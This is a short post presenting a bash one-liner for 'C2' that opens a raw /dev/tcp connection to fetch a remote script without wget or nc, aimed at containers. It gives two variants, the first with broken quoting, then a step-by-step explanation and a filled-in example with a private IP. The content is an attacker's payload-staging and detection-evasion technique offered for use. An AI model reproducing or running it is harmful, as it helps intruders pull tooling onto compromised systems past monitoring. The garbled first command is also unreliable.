# One liner bash for C2 without using any native program like wget, nc etc, esp containers. 
```bash
bash-c "exec 3<>/dev/tcp/IP/80; echo -e GET/ youfile.sh HTTP/1.1\r\nHost; ip\r\nConnection: close\r\n\r\n' >&3; cat <&3-> yourfile.sh'
```
or If Not Use 
```bash
bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /yourfile.sh HTTP/1.1\r\nHost: IP\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh"
```

## Explanation How it Work

1. **`exec 3<>/dev/tcp/IP/80`**  
   Opens a TCP connection to the specified `IP` on port `80` and assigns it to file descriptor `3`.

2. **`echo -e 'GET /yourfile.sh HTTP/1.1\r\nHost: IP\r\nConnection: close\r\n\r\n' >&3`**  
   Sends an HTTP GET request to the server.  
   - `GET /yourfile.sh HTTP/1.1`: Requests the file `yourfile.sh` using HTTP/1.1.  
   - `Host: IP`: Specifies the host (replace `IP` with the server's IP or hostname).  
   - `Connection: close`: Ensures the connection is closed after the request.  
   - `\r\n`: Represents a carriage return and newline for proper HTTP formatting.

3. **`cat <&3 > yourfile.sh`**  
   Reads the server's response from file descriptor `3` and saves it to `yourfile.sh`.


## Example

If the server IP is `192.168.1.100` and the file is `script.sh`, the command would look like this:

```bash
bash -c "exec 3<>/dev/tcp/192.168.1.100/80; echo -e 'GET /script.sh HTTP/1.1\r\nHost: 192.168.1.100\r\nConnection: close\r\n\r\n' >&3; cat <&3 > script.sh"
```



## Notes

- Replace `IP` with the actual IP address or hostname of the server.
- Replace `/yourfile.sh` with the path to the file you want to download.
- Ensure the server is running on port `80` and allows HTTP requests.
- This method only works for plain HTTP. For HTTPS, use tools like `curl` or `wget`.
Don’t forget the reactions and stars⭐️! 
They fuel my energy to post such contents🔋✨.
